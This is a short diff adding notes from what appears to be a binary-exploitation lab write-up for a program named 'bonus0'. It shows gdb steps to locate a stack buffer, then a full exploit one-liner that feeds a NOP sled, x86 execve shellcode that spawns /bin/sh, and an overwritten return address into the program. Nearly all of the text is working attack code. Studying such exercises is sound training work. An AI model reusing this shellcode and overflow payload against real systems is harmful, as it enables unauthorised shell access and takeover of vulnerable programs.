@@ -1,0 +1,6 @@
+We write inside the buffer the shell code and we need to find the address of the buffer for that:
+break *0x080484bd
+info registers
+We can see the eax is at 0xbffff6b8
+SO the begginning of the buffer is 0xbffff6b8-0x1018= BFFFE6A0
+(python -c 'print "\x90" * 200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"' && python -c 'print "\x41" * 9 + "\x10\xe7\xff\xbf" * 3' && cat ) | ./bonus0
